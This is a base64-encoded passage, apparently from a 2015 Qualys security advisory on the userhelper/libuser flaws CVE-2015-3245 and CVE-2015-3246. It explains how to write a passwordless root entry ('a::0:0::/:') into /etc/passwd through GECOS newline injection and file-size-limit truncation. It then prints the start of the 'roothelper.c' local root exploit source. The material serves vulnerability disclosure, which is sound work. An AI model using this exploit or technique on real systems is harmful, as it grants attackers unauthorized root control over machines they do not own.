dCBvbg0KICAvZXRjL3Bhc3N3ZCBhbmQgdGhlICJzYW1lIENQVSwgZGlmZmVyZW50IHByaW9yaXRpZXMiIHByZWVtcHRpb24gb2YNCiAgdXNlcmhlbHBlci4NCg0KLSBvciB3ZSBleHBsb2l0IFZ1bG5lcmFiaWxpdHkgIzEgYW5kIGluamVjdCBhICdcbicgaW50byBvdXIgb3duIEdFQ09TDQogIGZpZWxkLiBBcyBmYXIgYXMgbGlidXNlciBpcyBjb25jZXJuZWQsIHRoaXMgJ1xuJyBlbmRzIG91ciB1c2VyJ3MgbGluZQ0KICBhbmQgYmVnaW5zIGEgbmV3IG9uZSAod2l0aCBvdXIgbGVmdG92ZXIgaG9tZS1kaXJlY3RvcnkgYW5kDQogIHNoZWxsLXByb2dyYW0gZmllbGRzKTogb3VyIHVzZXIncyBsaW5lIGlzIG5vIGxvbmdlciB0aGUgbGFzdCBvbmUgaW4NCiAgL2V0Yy9wYXNzd2QuDQoNCg0KLS0tLVsgUHJvYmxlbSAjNCAobWF4aW11bSBHRUNPU19MRU5HVEgpDQoNCkFzIHNob3duIGluIG91ciAiRXhwbG9pdGF0aW9uIE92ZXJ2aWV3IiBleGFtcGxlLCB3ZSBvbmx5IGhhdmUgdHdvDQpvcHRpb25zIGZvciBhcmJpdHJhcnkgY2hhcmFjdGVyIGluamVjdGlvbiBpbnRvIC9ldGMvcGFzc3dkOg0KDQotIGVpdGhlciB3ZSB1c2UgYSBjaGFyYWN0ZXIgdGhhdCB3ZSBhcnRpZmljaWFsbHkgaW5qZWN0IHRocm91Z2ggb3VyIG93bg0KICBHRUNPUyBmaWVsZCAobm90IGFuIG9wdGlvbiBmb3IgY2hhcmFjdGVycyBsaWtlICc6JyBhbmQgJ1xuJyk7DQoNCi0gb3Igd2UgcmV1c2UgYSBjaGFyYWN0ZXIgdGhhdCBpcyBuYXR1cmFsbHkgcHJlc2VudCBpbiAvZXRjL3Bhc3N3ZCAob3VyDQogIG9ubHkgb3B0aW9uIGZvciBjaGFyYWN0ZXJzIGxpa2UgJzonIGFuZCAnXG4nKS4NCg0KVW5mb3J0dW5hdGVseSwgYm90aCBvZiB0aGVzZSBvcHRpb25zIG1pZ2h0IGZhaWwgdG8gaW5qZWN0IGEgY2hhcmFjdGVyDQphZnRlciB0aGUgZW5kIG9mIC9ldGMvcGFzc3dkIChhIGNvbnNlcXVlbmNlIG9mIFByb2JsZW0gIzIpOg0KDQotIGlmIG91ciBvd24gR0VDT1MgZmllbGQgaXMgdG9vIGZhciBhd2F5IGZyb20gdGhlIGVuZCBvZiAvZXRjL3Bhc3N3ZA0KICAoZmFydGhlciB0aGFuIHVzZXJoZWxwZXIncyBtYXhpbXVtIEdFQ09TX0xFTkdUSCwgMTI3IGNoYXJhY3RlcnMpOw0KDQotIGlmIHRoZSBjaGFyYWN0ZXIgaXMgbm90IGFscmVhZHkgb25lIG9mIHRoZSBsYXN0IEdFQ09TX0xFTkdUSA0KICBjaGFyYWN0ZXJzIGluIC9ldGMvcGFzc3dkLg0KDQpJZiBmYWNlZCB3aXRoIGJvdGggb2YgdGhlc2UgcHJvYmxlbXMsIHdlIHNvbHZlIHRoZSBmaXJzdCBvbmUgKGFuZA0KUHJvYmxlbSAjNCkgYnkgcmVwZWF0ZWRseSBkZWxldGluZyBsaW5lcyBmcm9tIHRoZSBlbmQgb2YgL2V0Yy9wYXNzd2QsDQp1bnRpbCBvdXIgb3duIHVzZXIncyBsaW5lIGlzIHRoZSBsYXN0IG9uZSBpbiB0aGUgZmlsZTogd2UgZW5sYXJnZSBvdXINCm93biBHRUNPUyBmaWVsZCwgZGVsZXRlIGNoYXJhY3RlcnMgZnJvbSB0aGUgZW5kIG9mIC9ldGMvcGFzc3dkIHdpdGggb3VyDQpSTElNSVRfRlNJWkUgc2Npc3NvcnMsIHNocmluayBvdXIgR0VDT1MgZmllbGQgYWdhaW4sIHJlcGVhdC4NCg0KDQotLS0tWyBQcm9ibGVtICM1ICh0aW1lIGNvbXBsZXhpdHkpDQoNCkZvciBlYWNoIGNoYXJhY3RlciBpbiB0aGUgYS1saW5lLCB3ZSB1c3VhbGx5IGhhdmUgdG8gY2hvb3NlIG9uZSBvZg0Kc2V2ZXJhbCAoR0VDT1MsIFJMSU1JVF9GU0laRSkgcGFpcnMgdGhhdCBhbGxvdyB1cyB0byB3cml0ZSB0aGUgY2hhcmFjdGVyDQp0byBpdHMgdGFyZ2V0IG9mZnNldCBpbiAvZXRjL3Bhc3N3ZC4NCg0KVGhlc2UgcGFpcnMgcmVwcmVzZW50IHRoZSBub2RlcyBvZiBhIHNlYXJjaCB0cmVlIHRoYXQgZ3Jvd3MNCmV4cG9uZW50aWFsbHkgKHdpdGggdGhlIG51bWJlciBvZiBjaGFyYWN0ZXJzIGluIHRoZSBhLWxpbmUpIGJ1dCBtYXkNCmNvbnRhaW4gZmV3IG9yIG5vIHNvbHV0aW9ucy4gSW4gb3JkZXIgdG8gYXZvaWQgdGhpcyB0cmVlJ3Mgd29yc3QtY2FzZQ0KdGltZSBjb21wbGV4aXR5LCB3ZToNCg0KLSBpbmplY3QgdGhlIHNob3J0ZXN0IGEtbGluZSBwb3NzaWJsZSwgIlxuYTo6MDowOjovOlxuIjsNCg0KLSBwZXJmb3JtIGEgcmVjdXJzaXZlIGRlcHRoLWZpcnN0IHNlYXJjaCBvbiB0aGUgdHJlZSwgYW5kIHJldHVybiB0aGUNCiAgZmlyc3Qgc29sdXRpb24gd2UgZmluZCAoaW5zdGVhZCBvZiwgZm9yIGV4YW1wbGUsIHRoZSBzb2x1dGlvbiB0aGF0DQogIG1pbmltaXplcyAvZXRjL3Bhc3N3ZCdzIGFsdGVyYXRpb25zKTsNCg0KLSByZXBsYWNlIHRoZSBhLWxpbmUncyB1c2VybmFtZSB3aXRoIGEgd2lsZGNhcmQsIGFuZCBhY2NlcHQgYW55DQogIGxvd2VyY2FzZSBjaGFyYWN0ZXIgdGhhdCBpcyBub3QgYWxyZWFkeSBhIHVzZXJuYW1lICh0aGUgYS1saW5lJ3MNCiAgdXNlcm5hbWUgd2FzIGEgbWFqb3IgcHJvYmxlbSwgYmVjYXVzZSBpdCBpcyB0aGUgbGFzdCBjaGFyYWN0ZXIgd2UNCiAgaW5qZWN0LCBhbmQgdGhlcmVmb3JlIG9jY3VycyBkZWVwIGRvd24gdGhlIHRyZWUncyBicmFuY2hlczsgdGhlDQogIGEtbGluZSdzICcwJyBjaGFyYWN0ZXJzIGFyZSBvbmx5IGEgbWlub3IgcHJvYmxlbSwgYmVjYXVzZSB0aGV5IG9jY3VyDQogIGluIHRoZSBtaWRkbGUgb2YgdGhlIHRyZWUncyBicmFuY2hlcywgd2hlbmNlIHdlIGNhbiBiYWNrdHJhY2sNCiAgcXVpY2tseSkuDQoNCg0KLS0tLVsgY2hmbg0KDQp1dGlsLWxpbnV4J3MgY2hmbiBmcm9tIFJlZCBIYXQncyBjb2RlYmFzZSBpcyBsaW5rZWQgd2l0aCBsaWJ1c2VyLCBhbmQNCmNhbiBiZSBleHBsb2l0ZWQgYnkgb3VyIHB1YmxpYyByb290aGVscGVyLmMgd2l0aCBqdXN0IGEgZmV3IGNoYW5nZXMNCihsZWZ0IGFzIGFuIGV4ZXJjaXNlIGZvciB0aGUgaW50ZXJlc3RlZCByZWFkZXIpOg0KDQotIHVzZXJoZWxwZXIgdXNlcyBhIHNpbXBsZSBVc2VyaGVscGVyL0NvbnNvbGVoZWxwZXIgcmVxdWVzdC9yZXNwb25zZQ0KICBwcm90b2NvbCBpbiBvcmRlciB0byBwcm9tcHQgZm9yIGFuZCByZWFkIHRoZSB1c2VyJ3MgcGFzc3dvcmQsIGJ1dCBjaGZuDQogIHVzZXMgdHJhZGl0aW9uYWwgdGVybWluYWwgaW50ZXJhY3Rpb247DQoNCi0gaWYgb3VyIHVzZXIncyBsaW5lIGlzIHRoZSBsYXN0IG9uZSBpbiAvZXRjL3Bhc3N3ZCwgd2UgY2FuIGV4cGxvaXQNCiAgVnVsbmVyYWJpbGl0eSAjMSBhZ2FpbnN0IHVzZXJoZWxwZXIsIGJ1dCB3ZSBoYXZlIHRvIHdpbiBQcm9ibGVtICMzJ3MNCiAgd3JpdGUvZnRydW5jYXRlIHJhY2UgYWdhaW5zdCBjaGZuOw0KDQotIHVzZXJoZWxwZXIgcmV0dXJucyAwLzI1NSBvbiBzdWNjZXNzL2ZhaWx1cmUsIGJ1dCBjaGZuIHJldHVybnMgMC8xLg0KDQoNCi0tWyBBY2tub3dsZWRnbWVudHMgXS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KDQpXZSB3b3VsZCBsaWtlIHRvIHRoYW5rIFJlZCBIYXQncyBTZWN1cml0eSBSZXNwb25zZSBUZWFtIGFuZCBkZXZlbG9wZXJzDQpmb3IgcHJvbXB0bHkgYWRkcmVzc2luZyB0aGVzZSBpc3N1ZXMuDQoNCg0KDQotLS0tLS0gcm9vdGhlbHBlci5jIGV4cGxvaXQgLS0tLS0tDQovKg0KICogcm9vdGhlbHBlci5jIC0gYW4gdW51c3VhbCBsb2NhbCByb290IGV4cGxvaXQgYWdhaW5zdDoNCiAqIENWRS0yMDE1LTMyNDUgdXNlcmhlbHBlciBjaGZuKCkgbmV3bGluZSBmaWx0ZXJpbmcNCiAqIENWRS0yMDE1LTMyNDYgbGlidXNlciBwYXNzd2QgZmlsZSBoYW5kbGluZw0KICogQ29weXJpZ2h0IChDKSAyMDE1IFF1YWx5cywgSW5jLg0KICoNCiAqIGdlY29zXyogdHlwZXMgYW5kIGZ1bmN0aW9ucyBpbnNwaXJlZCBieSB1c2VyaGVscGVyLmMNCiAqIENvcHlyaWdodCAoQykgMTk5Ny0yMDAzLCAyMDA3LCAyMDA4IFJlZCBIYXQsIEluYy4NCiAqDQogKiBVSF8qICNkZWZpbmVzIGFuZCBjb21tZW50cyBpbnNwaXJlZCBieSB1c2VyaGVscGVyLmgNCiAqIENvcHlyaWdodCAoQykgMTk5Ny0yMDAxLCAyMDA3IFJlZCBIYXQsIEluYy4NCiAqDQogKiBUaGlzIHByb2dyYW0gaXMgZnJlZSBzb2Z0d2FyZTogeW91IGNhbiByZWRpc3RyaWJ1dGUgaXQgYW5kL29yIG1vZGlmeQ0KICogaXQgdW5kZXIgdGhlIHRlcm1zIG9mIHRoZSBHTlUgR2VuZXJhbCBQdWJsaWMgTGljZW5zZSBhcyBwdWJsaXNoZWQgYnkNCiAqIHRoZSBGcmVlIFNvZnR3YXJlIEZvdW5kYXRpb24sIGVpdGhlciB2ZXJzaW9uIDMgb2YgdGhlIExpY2Vuc2UsIG9yDQogKiAoYXQgeW91ciBvcHRpb24pIGFueSBsYXRlciB2ZXJzaW9uLg0KICoNCiAqIFRoaXMgcHJvZ3JhbSBpcyBkaXN0cmlidXRlZCBpbiB0aGUgaG9wZSB0aGF0IGl0IHdpbGwgYmUgdXNlZnVsLA0KICogYnV0IFdJVEhPVVQgQU5ZIFdBUlJBTlRZOyB3aXRob3V0IGV2ZW4gdGhlIGltcGxpZWQgd2FycmFudHkgb2YNCiAqIE1FUkNIQU5UQUJJTElUWSBvciBGSVRORVNTIEZPUiBBIFBBUlRJQ1VMQVIgUFVSUE9TRS4gIFNlZSB0aGUNCiAqIEdOVSBHZW5lcmFsIFB1YmxpYyBMaWNlbnNlIGZvciBtb3JlIGRldGFpbHMuDQogKg0KICogWW91IHNob3VsZCBoYXZlIHJlY2VpdmVkIGEgY29weSBvZiB0aGUgR05VIEdlbmVyYWwgUHVibGljIExpY2Vuc2UNCiAqIGFsb25nIHdpdGggdGhpcyBwcm9ncmFtLiAgSWYgbm90LCBzZWUgPGh0dHA6Ly93d3cuZ251Lm9yZy9saWNlbnNlcy8+Lg0KICovDQoNCiNkZWZpbmUgX0dOVV9TT1VSQ0UNCiNpbmNsdWRlIDxjdHlwZS5oPg0KI2luY2x1ZGUgPGVycm5vLmg+DQojaW5jbHVkZSA8ZmNudGwuaD4NCiNpbmNsdWRlIDxpbnR0eXBlcy5oPg0KI2luY2x1ZGUgPGxpbWl0cy5oPg0KI2luY2x1ZGUgPHB3ZC5oPg0KI2luY2x1ZGUgPHNjaGVkLmg+DQojaW5jbHVkZSA8c2lnbmFsLmg+DQojaW5jbHVkZSA8c3RkYXJnLmg+DQojaW5jbHVkZSA8c3RkYm9vbC5oPg0KI2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RkbGliLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8c3lzL2lub3RpZnkuaD4NCiNpbmNsdWRlIDxzeXMvcmVzb3VyY2UuaD4NCiNpbmNsdWRlIDxzeXMvc29ja2V0Lmg+DQojaW5jbHVkZSA8c3lzL3N0YXQuaD4NCiNpbmNsdWRlIDxzeXMvdGltZS5oPg0KI2luY2x1ZGUgPHN5cy90eXBlcy5oPg0KI2luY2x1ZGUgPHN5cy93YWl0Lmg+DQojaW5jbHVkZSA8dW5pc3RkLmg+DQoNCi8qIEEgbWF4aW11bSBHRUNPUyBmaWVsZCBsZW5ndGguICBUaGVyZSdzIG5vIGhhcmQgbGltaXQsIHNvIHdlIGd1ZXNzLiAqLw0KI2RlZmluZSBHRUNPU19MRU5HVEggICAgICAgICAgICAgICAgICAgIDEyNw0KDQp0eXBlZGVmIGNoYXIgZ2Vjb3NfZmllbGRbR0VDT1NfTEVOR1RIXTsNCg0KLyogQSBzdHJ1Y3R1cmUgdG8gaG9sZCBicm9rZW4tb3V0IEdFQ09TIGRhdGEuICBUaGUgbnVtYmVyIGFuZCBuYW1lcyBvZiB0aGUNCiAqIGZpZWxkcyBhcmUgZGljdGF0ZWQgZW50aXJlbHkgYnkgdGhlIGZsYXZvciBvZiBmaW5nZXIgd2UgdXNlLiAgU2VyaW91c2x5LiAqLw0Kc3RydWN0IGdlY29zX2RhdGEgew0KICAgIGdlY29zX2ZpZWxkIGZ1bGxfbmFtZTsgICAgICAvKiBmdWxsIHVzZXIgbmFtZSAqLw0KICAgIGdlY29zX2ZpZWxkIG9mZmljZTsgICAgICAgICAvKiBvZmZpY2UgKi8NCiAgICBnZWNvc19maWVsZCBvZmZpY2VfcGhvbmU7ICAgLyogb2ZmaWNlIHBob25lICovDQogICAgZ2Vjb3NfZmllbGQgaG9tZV9waG9uZTsgICAgIC8qIGhvbWUgcGhvbmUgKi8NCiAgICBnZWNvc19maWVsZCBzaXRlX2luZm87ICAgICAgLyogb3RoZXIgc3R1ZmYgKi8NCn07DQoNCnN0YXRpYyBzdHJ1Y3QgdXNlcmhlbHBlciB7DQogICAgc3RydWN0IGdlY29zX2RhdGEgZ2Vjb3M7DQogICAgcmxpbV90IGZzaXplbGltOw0KICAgIHBpZF90IHBpZDsNCiAgICBpbnQgZmQ7DQp9IHVzZXJoZWxwZXJzW0dFQ09TX0xFTkdUSF07DQoNCnN0YXRpYyB2b2lkDQpkaWVfaW5fcGFyZW50KGNvbnN0IGNoYXIgKmNvbnN0IGZpbGUsIGNvbnN0IHVuc2lnbmVkIGludCBsaW5lLA0KICAgICAgICAgICAgICBjb25zdCBjaGFyICpjb25zdCBmdW5jdGlvbikNCnsNCiAgICBmcHJpbnRmKHN0ZGVyciwgImRpZWQgaW4gcGFyZW50OiAlczoldTogJXNcbiIsIGZpbGUsIGxpbmUsIGZ1bmN0aW9uKTsNCiAgICBmZmx1c2goc3RkZXJyKTsNCg0KICAgIHVuc2lnbmVkIGludCBpOw0KICAgIGZvciAoaSA9IDA7IGkgPCBHRUNPU19MRU5HVEg7IGkrKykgew0KICAgICAgICBjb25zdCBwaWRfdCBwaWQgPSB1c2VyaGVscGVyc1tpXS5waWQ7DQogICAgICAgIGlmIChwaWQgPD0gMCkgY29udGludWU7DQogICAgICAgIGtpbGwocGlkLCBTSUdLSUxMKTsNCiAgICB9DQogICAgX2V4aXQoRVhJVF9GQUlMVVJFKTsNCn0NCg0Kc3RhdGljIHZvaWQNCmRpZV9pbl9jaGlsZChjb25zdCBjaGFyICpjb25zdCBmaWxlLCBjb25zdCB1bnNpZ25lZCBpbnQgbGluZSwNCiAgICAgICAgICAgICBjb25zdCBjaGFyICpjb25zdCBmdW5jdGlvbikNCnsNCiAgICBmcHJpbnRmKHN0ZGVyciwgImRpZWQgaW4gY2hpbGQ6ICVzOiV1OiAlc1xuIiwgZmlsZSwgbGluZSwgZnVuY3Rpb24pOw0KICAgIGV4aXQoRVhJVF9GQUlMVVJFKTsNCn0NCg0Kc3RhdGljIHZvaWQgKCpkaWVfZm4pKGNvbnN0IGNoYXIgKiwgdW5zaWduZWQgaW50LCBjb25zdCBjaGFyICopID0gZGllX2luX3BhcmVudDsNCiNkZWZpbmUgZGllKCkgZGllX2ZuKF9fRklMRV9fLCBfX0xJTkVfXywgX19mdW5jX18pDQoNCnN0YXRpYyB2b2lkICoNCnhtYWxsb2MoY29uc3Qgc2l6ZV90IHNpemUpDQp7DQogICAgaWYgKHNpemUgPD0gMCkgZGllKCk7DQogICAgaWYgKHNpemUgPj0gSU5UX01BWCkgZGllKCk7DQogICAgdm9pZCAqY29uc3QgcHRyID0gbWFsbG9jKHNpemUpOw0KICAgIGlmIChwdHIgPT0gTlVMTCkgZGllKCk7DQogICAgcmV0dXJuIHB0cjsNCn0NCg0Kc3RhdGljIHZvaWQgKg0KeHJlYWxsb2Modm9pZCAqY29uc3Qgb2xkLCBjb25zdCBzaXplX3Qgc2l6ZSkNCnsNCiAgICBpZiAoc2l6ZSA8PSAwKSBkaWUoKTsNCiAgICBpZiAoc2l6ZSA+PSBJTlRfTUFYKSBkaWUoKTsNCiAgICB2b2lkICpjb25zdCBuZXcgPSByZWFsbG9jKG9sZCwgc2l6ZSk7DQogICAgaWYgKG5ldyA9PSBOVUxMKSBkaWUoKTsNCiAgICByZXR1cm4gbmV3Ow0KfQ0KDQpzdGF0aWMgY2hhciAqDQp4c3RybmR1cChjb25zdCBjaGFyICpjb25zdCBvbGQsIGNvbnN0IHNpemVfdCBsZW4pDQp7DQogICAgaWYgKG9sZCA9PSBOVUxMKSBkaWUoKTsNCiAgICBpZiAobGVuID49IElOVF9NQVgpIGRpZSgpOw0KDQogICAgY2hhciAqY29uc3QgbmV3ID0gc3RybmR1cChvbGQsIGxlbik7DQoNCiAgICBpZiAobmV3ID09IE5VTEwpIGRpZSgpOw0KICAgIGlmIChsZW4gIT0gc3RybGVuKG5ldykpIGRpZSgpOw0KICAgIHJldHVybiBuZXc7DQp9DQoNCnN0YXRpYyBpbnQNCnhzbnByaW50ZihjaGFyICpjb25zdCBzdHIsIGNvbnN0IHNpemVfdCBzaXplLCBjb25zdCBjaGFyICpjb25zdCBmb3JtYXQsIC4uLikNCnsNCiAgICBpZiAoc3RyID09IE5VTEwpIGRpZSgpOw0KICAgIGlmIChzaXplIDw9IDApIGRpZSgpOw0KICAgIGlmIChzaXplID49IElOVF9NQVgpIGRpZSgpOw0KICAgIGlmIChmb3JtYXQgPT0gTlVMTCkgZGllKCk7DQoNCiAgICB2YV9saXN0IGFwOw0KICAgIHZhX3N0YXJ0KGFwLCBmb3JtYXQpOw0KICAgIGNvbnN0IGludCBsZW4gPSB2c25wcmludGYoc3RyLCBzaXplLCBmb3JtYXQsIGFwKTsNCiAgICB2YV9lbmQoYXApOw0KDQogICAgaWYgKGxlbiA8IDApIGRpZSgpOw0KICAgIGlmICgodW5zaWduZWQgaW50KWxlbiA+PSBzaXplKSBkaWUoKTsNCiAgICBpZiAoKHVuc2lnbmVkIGludClsZW4gIT0gc3RybGVuKHN0cikpIGRpZSgpOw0KICAgIHJldHVybiBsZW47DQp9DQoNCnN0YXRpYyBpbnQNCnhvcGVuKGNvbnN0IGNoYXIgKmNvbnN0IHBhdGhuYW1lLCBjb25zdCBpbnQgZmxhZ3MpDQp7DQogICAgaWYgKHBhdGhuYW1lID09IE5VTEwpIGRpZSgpOw0KICAgIGlmICgqcGF0aG5hbWUgIT0gJy8nKSBkaWUoKTsNCiAgICBpZiAoZmxhZ3MgIT0gT19SRE9OTFkpIGRpZSgpOw0KDQogICAgY29uc3QgaW50IGZkID0gb3BlbihwYXRobmFtZSwgZmxhZ3MpOw0KICAgIGlmIChmZCA8PSAtMSkgZGllKCk7DQoNCiAgICBzdGF0aWMgY29uc3Qgc3RydWN0IGZsb2NrIHJkbG9jayA9IHsNCiAgICAgICAgLmxfdHlwZSA9IEZfUkRMQ0ssDQogICAgICAgIC5sX3doZW5jZSA9IFNFRUtfU0VULA0KICAgICAgICAubF9zdGFydCA9IDAsDQogICAgICAgIC5sX2xlbiA9IDANCiAgICB9Ow0KICAgIGlmIChmY250bChmZCwgRl9TRVRMSywgJnJkbG9jaykgIT0gMCkgZGllKCk7DQogICAgcmV0dXJuIGZkOw0KfQ0KDQpzdGF0aWMgdm9pZA0KeGNsb3NlKGNvbnN0IGludCBmZCkNCnsNCiAgICBpZiAoZmQgPD0gLTEpIGRpZSgpOw0KICAgIHN0YXRpYyBjb25zdCBzdHJ1Y3QgZmxvY2sgdW5sb2NrID0gew0KICAgICAgICAubF90eXBlID0gRl9VTkxDSywNCiAgICAgICAgLmxfd2hlbmNlID0gU0VFS19TRVQsDQogICAgICAgIC5sX3N0YXJ0ID0gMCwNCiAgICAgICAgLmxfbGVuID0gMA0KICAgIH07DQogICAgaWYgKGZjbnRsKGZkLCBGX1NFVExLLCAmdW5sb2NrKSAhPSAwKSBkaWUoKTsNCiAgICBpZiAoY2xvc2UoZmQpICE9IDApIGRpZSgpOw0KfQ0KDQojZGVmaW5lIEdFQ09TX0JBRENIQVJTICI6LD1cbiINCg0KLyogQSBzaW1wbGUgZnVuY3Rpb24gdG8gY29tcHV0ZSB0aGUgc2l6ZSBvZiBhIGdlY29zIHN0cmluZyBjb250YWluaW5nIHRoZQ0KICogZGF0YSB3ZSBoYXZlLiAqLw0Kc3RhdGljIHNpemVfdA0KZ2Vjb3Nfc2l6ZShjb25zdCBzdHJ1Y3QgZ2Vjb3NfZGF0YSAqY29uc3QgcGFyc2VkKQ0Kew0KICAgIGlmIChwYXJzZWQgPT0gTlVMTCkgZGllKCk7DQoNCiAgICBzaXplX3QgbGVuID0gNDsgLyogY29tbWFzISAqLw0KICAgIGxlbiArPSBzdHJsZW4ocGFyc2VkLT5mdWxsX25hbWUpOw0KICAgIGxlbiArPSBzdHJsZW4ocGFyc2VkLT5vZmZpY2UpOw0KICAgIGxlbiArPSBzdHJsZW4ocGFyc2VkLT5vZmZpY2VfcGhvbmUpOw0KICAgIGxlbiArPSBzdHJsZW4ocGFyc2VkLT5ob21lX3Bob25lKTsNCiAgICBsZW4gKz0gc3RybGVuKHBhcnNlZC0+c2l0ZV9pbmZvKTsNCiAgICBsZW4rKzsNCiAgICByZXR1cm4gbGVuOw0KfQ0KDQovKiBQYXJzZSB0aGUgcGFzc2VkLWluIEdFQ09TIHN0cmluZyBhbmQgc2V0IFBBUlNFRCB0byBpdHMgYnJva2VuLWRvd24gY29udGVudHMuDQogICBOb3RlIHRoYXQgdGhlIHBhcnNpbmcgaXMgcGVyZm9ybWVkIHVzaW5nIHRoZSBjb252ZW50aW9uIG9iZXllZCBieSBCU0Rpc2gNCiAgIGZpbmdlcigxKSB1bmRlciBMaW51eC4gKi8NCnN0YXRpYyB2b2lkDQpnZWNvc19wYXJzZShjb25zdCBjaGFyICpjb25zdCBnZWNvcywgc3RydWN0IGdlY29zX2RhdGEgKmNvbnN0IHBhcnNlZCkNCnsNCiAgICBpZiAoZ2Vjb3MgPT0gTlVMTCkgZGllKCk7DQogICAgaWYgKHN0cmxlbihnZWNvcykgPj0gSU5UX01BWCkgZGllKCk7DQoNCiAgICBpZiAocGFyc2VkID09IE5VTEwpIGRpZSgpOw0KICAgIG1lbXNldChwYXJzZWQsIDAsIHNpemVvZigqcGFyc2VkKSk7DQoNCiAgICB1bnNpZ25lZCBpbnQgaTsNCiAgICBjb25zdCBjaGFyICpmaWVsZCA9IGdlY29zOw0KDQogICAgZm9yIChpID0gMDsgOyBpKyspIHsNCiAgICAgICAgY29uc3QgY2hhciAqZmllbGRfZW5kID0gc3RyY2hybnVsKGZpZWxkLCAnLCcpOw0KICAgICAgICBnZWNvc19maWVsZCAqZGVzdCA9IE5VTEw7DQoNCiAgICAgICAgc3dpdGNoIChpKSB7DQogICAgICAgIGNhc2UgMDoNCiAgICAgICAgICAgIGRlc3QgPSAmcGFyc2VkLT5mdWxsX25hbWU7DQogICAgICAgICAgICBicmVhazsNCiAgICAgICAgY2FzZSAxOg0KICAgICAgICAgICAgZGVzdCA9ICZwYXJzZWQtPm9mZmljZTsNCiAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICBjYXNlIDI6DQogICAgICAgICAgICBkZXN0ID0gJnBhcnNlZC0+b2ZmaWNlX3Bob25lOw0KICAgICAgICAgICAgYnJlYWs7DQogICAgICAgIGNhc2UgMzoNCiAgICAgICAgICAgIGRlc3QgPSAmcGFyc2VkLT5ob21lX3Bob25lOw0KICAgICAgICAgICAgYnJlYWs7DQogICAgICAgIGNhc2UgNDoNCiAgICAgICAgICAgIGZpZWxkX2VuZCA9IHJhd21lbWNocihmaWVsZF9lbmQsICdcMCcpOw0KICAgICAgICAgICAgZGVzdCA9ICZwYXJzZWQtPnNpdGVfaW5mbzsNCiAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICBkZWZhdWx0Og0KICAgICAgICAgICAgZGllKCk7DQogICAgICAgIH0NCiAgICAgICAgY29uc3Qgc2l6ZV90IGZpZWxkX2xlbiA9IGZpZWxkX2VuZCAtIGZpZWxkOw0KICAgICAgICB4c25wcmludGYoKmRlc3QsIHNpemVvZigqZGVzdCksICIlLipzIiwgKGludClmaWVsZF9sZW4sIGZpZWxkKTsNCiAgICAgICAgaWYgKHN0cmxlbigqZGVzdCkgIT0gZmllbGRfbGVuKSBkaWUoKTsNCg0KICAgICAgICBpZiAoc3RycGJyaygqZGVzdCwgR0VDT1NfQkFEQ0hBUlMpICE9IE5VTEwgJiYgaSAhPSA0KSBkaWUoKTsNCg0KICAgICAgICBpZiAoKmZpZWxkX2VuZCA9PSAnXDAnKSBicmVhazsNCiAgICAgICAgZmllbGQgPSBmaWVsZF9lbmQgKyAxOw0KICAgIH0NCiAgICBpZiAoZ2Vjb3Nfc2l6ZShwYXJzZWQpID4gR0VDT1NfTEVOR1RIKSBkaWUoKTsNCn0NCg0KLyogQXNzZW1ibGUgYSBuZXcgZ2Vjb3Mgc3RyaW5nLiAqLw0Kc3RhdGljIGNvbnN0IGNoYXIgKg0KZ2Vjb3NfYXNzZW1ibGUoY29uc3Qgc3RydWN0IGdlY29zX2RhdGEgKmNvbnN0IHBhcnNlZCkNCnsNCiAgICBzdGF0aWMgY2hhciByZXRbR0VDT1NfTEVOR1RIXTsNCiAgICBzaXplX3QgaTsNCg0KICAgIGlmIChwYXJzZWQgPT0gTlVMTCkgZGllKCk7DQogICAgLyogQ29uc3RydWN0IHRoZSBiYXNpYyB2ZXJzaW9uIG9mIHRoZSBzdHJpbmcuICovDQogICAgeHNucHJpbnRmKHJldCwgc2l6ZW9mKHJldCksICIlcywlcywlcywlcywlcyIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhcnNlZC0+ZnVsbF9uYW1lLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXJzZWQtPm9mZmljZSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFyc2VkLT5vZmZpY2VfcGhvbmUsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhcnNlZC0+aG9tZV9waG9uZSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFyc2VkLT5zaXRlX2luZm8pOw0KICAgIC8qIFN0cmlwIG9mZiB0ZXJtaW5hbCBjb21tYXMuICovDQogICAgaSA9IHN0cmxlbihyZXQpOw0KICAgIHdoaWxlICgoaSA+IDApICYmIChyZXRbaSAtIDFdID09ICcsJykpIHsNCiAgICAgICAgcmV0W2kgLSAxXSA9ICdcMCc7DQogICAgICAgIGktLTsNCiAgICB9DQogICAgcmV0dXJuIHJldDsNCn0NCg0KLyogRGVzY3JpcHRvcnMgdXNlZCB0byBjb21tdW5pY2F0ZSBiZXR3ZWVuIHVzZXJoZWxwZXIgYW5kIGNvbnNvbGhlbHBlci4gKi8NCiNkZWZpbmUgVUhfSU5GSUxFTk8gMw0KI2RlZmluZSBVSF9PVVRGSUxFTk8gNA0KDQovKiBVc2VyaGVscGVyIHJlcXVlc3QgZm9ybWF0Og0KICAgcmVxdWVzdCBjb2RlIGFzIGEgc2luZ2xlIGNoYXJhY3RlciwNCiAgIHJlcXVlc3QgZGF0YSBzaXplIGFzIFVIX1JFUVVFU1RfU0laRV9ESUdJVFMgZGVjaW1hbCBkaWdpdHMNCiAgIHJlcXVlc3QgZGF0YQ0KICAgJ1xuJyAqLw0KI2RlZmluZSBVSF9SRVFVRVNUX1NJWkVfRElHSVRTIDgNCg0KLyogU3luY2hyb25pemF0aW9uIHBvaW50IGNvZGUuICovDQojZGVmaW5lIFVIX1NZTkNfUE9JTlQgMzINCg0KLyogVmFsaWQgdXNlcmhlbHBlciByZXF1ZXN0IGNvZGVzLiAqLw0KI2RlZmluZSBVSF9FQ0hPX09OX1BST01QVCAzNA0KI2RlZmluZSBVSF9FQ0hPX09GRl9QUk9NUFQgMzUNCiNkZWZpbmUgVUhfRVhQRUNUX1JFU1AgMzkNCiNkZWZpbmUgVUhfU0VSVklDRV9OQU1FIDQwDQojZGVmaW5lIFVIX1VTRVIgNDINCg0KLyogQ29uc29sZWhlbHBlciByZXNwb25z